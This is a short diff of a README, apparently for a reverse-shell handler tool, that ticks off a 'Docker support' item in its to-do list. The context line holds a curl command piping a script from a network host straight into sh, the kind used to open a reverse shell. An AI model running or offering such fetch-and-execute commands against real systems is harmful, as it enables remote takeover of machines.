@@ -124,6 +124,7 @@ curl http://192.168.1.2:8080/192.168.1.2/8080|sh
 - [ ] User guide
 - [ ] Benchmark
 - [ ] Upgrade to Metepreter session
+- [x] Docker support (Added by [yeya24](https://github.com/yeya24))
 
 
 ## Contributors
